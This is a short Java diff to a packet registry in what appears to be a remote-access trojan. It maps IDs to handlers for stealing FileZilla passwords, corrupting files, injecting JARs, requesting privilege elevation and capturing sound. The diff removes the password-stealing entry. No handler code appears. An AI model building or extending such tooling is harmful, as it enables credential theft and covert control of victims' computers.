@@ -72,7 +72,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put((byte) 65, Packet65Beep.class);
 		incomingPackets.put((byte) 66, Packet66PianoNote.class);
 		incomingPackets.put((byte) 67, Packet67LongPianoNote.class);
-		incomingPackets.put((byte) 68, Packet68FileZillaPassword.class);
+		// 68
 		incomingPackets.put((byte) 69, Packet69Print.class);
 		incomingPackets.put((byte) 70, Packet70CorruptFile.class);
 		incomingPackets.put((byte) 71, Packet71LocalNetworkDevices.class);
@@ -87,7 +87,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put((byte) 80, Packet80CustomRegQuery.class);
 		incomingPackets.put((byte) 81, Packet81InstalledPrograms.class);
 		incomingPackets.put((byte) 82, Packet82NetworkAdapters.class);
-		// 83 empty
+		// 83
 		incomingPackets.put((byte) 84, Packet84SoundCapture.class);
 		incomingPackets.put((byte) 85, Packet85ThumbnailPreview.class);
 		incomingPackets.put((byte) 86, Packet86ErrorLog.class);
@@ -103,7 +103,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put((byte) 96, Packet96EnvironmentVariables.class);
 		// 97
 		incomingPackets.put((byte) 98, Packet98InjectJAR.class);
-		// 99 empty
+		// 99
 		incomingPackets.put((byte) 100, Packet100RequestElevation.class);
 		incomingPackets.put((byte) 101, Packet101TransferPlugin.class);
 	}
